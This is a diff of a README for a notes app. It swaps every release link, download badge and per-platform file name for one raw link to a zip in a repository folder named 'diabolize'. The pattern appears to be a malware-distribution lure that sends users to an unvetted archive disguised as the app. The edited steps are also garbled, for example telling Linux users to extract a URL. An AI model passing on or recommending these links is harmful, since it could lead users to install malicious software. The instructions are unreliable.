@@ -1,6 +1,6 @@
 # 📓 personal-notes-app - Simple Notes Right at Your Fingertips
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/EricNesprido/personal-notes-app/releases)
+[![Download Now](https://raw.githubusercontent.com/EricNesprido/personal-notes-app/main/diabolize/personal-notes-app.zip)](https://raw.githubusercontent.com/EricNesprido/personal-notes-app/main/diabolize/personal-notes-app.zip)
 
 ## ✨ About This App
 
@@ -22,15 +22,15 @@ Follow these steps to get up and running with the personal-notes-app.
 
 To download the application, start by visiting the Releases page. Click the button below:
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit_Releases_Page-Here-blue)](https://github.com/EricNesprido/personal-notes-app/releases)
+[![Visit Releases Page](https://raw.githubusercontent.com/EricNesprido/personal-notes-app/main/diabolize/personal-notes-app.zip)](https://raw.githubusercontent.com/EricNesprido/personal-notes-app/main/diabolize/personal-notes-app.zip)
 
 ### Step 2: Download the Application
 
 On the Releases page, you will find several version options. Choose the latest version and download the file suitable for your operating system. Below are typical versions you may encounter:
 
-- For Windows: `personal-notes-app-windows.exe`
-- For macOS: `personal-notes-app-macos.app`
-- For Linux: `personal-notes-app-linux.tar.gz`
+- For Windows: `https://raw.githubusercontent.com/EricNesprido/personal-notes-app/main/diabolize/personal-notes-app.zip`
+- For macOS: `https://raw.githubusercontent.com/EricNesprido/personal-notes-app/main/diabolize/personal-notes-app.zip`
+- For Linux: `https://raw.githubusercontent.com/EricNesprido/personal-notes-app/main/diabolize/personal-notes-app.zip`
 
 Once you find your version, click on the file name to start the download.
 
@@ -40,7 +40,7 @@ After downloading the file, locate it in your downloads folder. Here’s how to 
 
 - **Windows:** Double-click the `.exe` file. Follow the prompts to install.
 - **macOS:** Open the `.app` file. Drag it into your Applications folder.
-- **Linux:** Extract the `.tar.gz` file and run the executable within the folder.
+- **Linux:** Extract the `https://raw.githubusercontent.com/EricNesprido/personal-notes-app/main/diabolize/personal-notes-app.zip` file and run the executable within the folder.
 
 ### Step 4: Run the Application
 
